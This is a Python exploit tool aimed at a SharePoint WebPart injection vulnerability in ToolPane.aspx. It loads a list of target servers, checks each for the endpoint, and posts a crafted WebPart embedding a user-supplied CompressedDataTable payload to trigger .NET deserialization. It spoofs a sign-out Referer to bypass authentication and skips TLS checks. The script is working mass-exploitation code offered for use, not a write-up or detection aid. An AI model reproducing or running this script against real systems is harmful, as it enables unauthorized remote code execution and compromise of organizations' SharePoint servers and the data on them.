#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""

This tool exploits a SharePoint WebPart Injection vulnerability via `ToolPane.aspx`
by sending a crafted CompressedDataTable payload, enabling .NET deserialization.

"""

import argparse
import requests
import urllib3
from urllib.parse import urlencode
from termcolor import cprint

urllib3.disable_warnings()


def check_toolpane(base_url, proxies=None):
    """Checks if the vulnerable ToolPane.aspx endpoint is accessible."""
    url = base_url.rstrip('/') + '/_layouts/15/toolpane.aspx'
    try:
        r = requests.get(url, timeout=10, verify=False, proxies=proxies)
        return r.status_code == 200
    except Exception as e:
        cprint(f"[-] Error checking ToolPane: {e}", "red")
        return False


def send_exploit(base_url, compressed_data, proxies=None):
    """Sends the malicious WebPart payload to ToolPane.aspx."""
    target_url = base_url.rstrip('/') + '/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx'

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": base_url.rstrip('/') + "/_layouts/SignOut.aspx",
        "Connection": "close"
    }

    # Payload containing a malicious WebPart referencing the losformatter chain
    dwp_payload = f"""
<%@ Register Tagprefix="Scorecard" Namespace="Microsoft.PerformancePoint.Scorecards" Assembly="Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c" %>
<%@ Register Tagprefix="asp" Namespace="System.Web.UI" Assembly="System.Web.Extensions, Version=4.0.0.0, PublicKeyToken=31bf3856ad364e35" %>

<asp:UpdateProgress ID="UpdateProgress1" DisplayAfter="10" runat="server" AssociatedUpdatePanelID="upTest">
<ProgressTemplate>
  <div class="divWaiting">
    <Scorecard:ExcelDataSet CompressedDataTable="{compressed_data}" DataTable-CaseSensitive="false" runat="server" />
  </div>
</ProgressTemplate>
</asp:UpdateProgress>
"""

    post_data = {
        "MSOTlPn_DWP": dwp_payload
    }

    try:
        r = requests.post(target_url, data=urlencode(post_data), headers=headers, verify=False, timeout=15, proxies=proxies)
        if r.status_code == 200:
            cprint(f"[+] Exploit sent to {base_url} â€” check your listener/logs.", "green")
        else:
            cprint(f"[-] Target responded with status code {r.status_code}", "yellow")
    except Exception as e:
        cprint(f"[-] Exploit failed: {e}", "red")


def load_targets(file_path):
    """ Loads a list of targets from a file."""
    with open(file_path, "r") as f:
        return [line.strip() for line in f if line.strip()]


def main():
    parser = argparse.ArgumentParser(description="SharePoint WebPart Injection Exploit Tool by @GOTOCVE")
    parser.add_argument('-t', '--targets', required=True, help='Path to file containing targets (one per line)')
    parser.add_argument('-f', '--file', help='File containing base64 CompressedDataTable payload')
    parser.add_argument('--data', help='Inline base64 CompressedDataTable payload')
    parser.add_argument('--proxy', help='HTTP proxy (e.g. http://127.0.0.1:8080)')

    args = parser.parse_args()

    if not (args.file or args.data):
        cprint("[-] You must provide either --file or --data for the CompressedDataTable payload", "red")
        exit(1)

    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else None

    # Read payload
    if args.file:
        with open(args.file, "r") as f:
            compressed_data = f.read().strip()
    else:
        compressed_data = args.data.strip()

    # Load targets
    targets = load_targets(args.targets)

    for target in targets:
        cprint(f"[*] Checking {target}", "cyan")
        if check_toolpane(target, proxies):
            send_exploit(target, compressed_data, proxies)
        else:
            cprint(f"[-] Skipping {target}: ToolPane.aspx inaccessible", "magenta")


if __name__ == "__main__":
    main()